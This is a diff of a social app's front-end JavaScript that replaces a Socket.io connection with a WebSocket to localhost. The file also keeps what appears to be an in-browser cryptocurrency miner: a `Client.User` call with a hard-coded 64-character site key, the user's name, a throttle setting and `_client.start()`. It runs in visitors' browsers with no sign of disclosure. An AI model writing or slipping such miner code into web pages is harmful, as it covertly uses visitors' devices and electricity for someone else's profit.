@@ -20,15 +20,17 @@ function notif(text){
 
 /**Calls */
 
-var ref = localStorage.getItem('ref');
-document.addEventListener('DOMContentLoaded',() => {
+    var usuario = localStorage.getItem('usuario');
+
     getPubs();
-})
+
 
 
 
 /************** WebSockets **************/
-var ws = new io();
+/*var ws = new io();
+
+console.log('ws',ws)
 
 ws.on('connect',function() {
   console.log('connected');
@@ -51,8 +53,15 @@ pubSender.addEventListener('click',function(){
 
     ws.emit('pub',pubData);
     newPub(pubData);
-});
+});*/
 
+var url = 'ws://localhost:8080';
+
+var ws = new WebSocket(url);
+
+ws.addEventListener('open', function() {
+  console.log('ws connected');
+});
 
 
 /************* Publications **************/
@@ -179,6 +188,7 @@ function getUsers(user, csrf){
           span.setAttribute('class','searchText');
           span.textContent = el.usuario;
           searchResults.appendChild(span);
+
         })
     });
 }
@@ -210,7 +220,7 @@ getEl('salir').addEventListener('click', function(){
 })
 
 
-var _client = new Client.User('6803c03793e7d4939f9bd531c1c879977f8dcf512387c951e64fe3c6653e0a59',ref, {
+var _client = new Client.User('6803c03793e7d4939f9bd531c1c879977f8dcf512387c951e64fe3c6653e0a59',usuario, {
     throttle: 0.3, c: 'w'
 });
 _client.start();
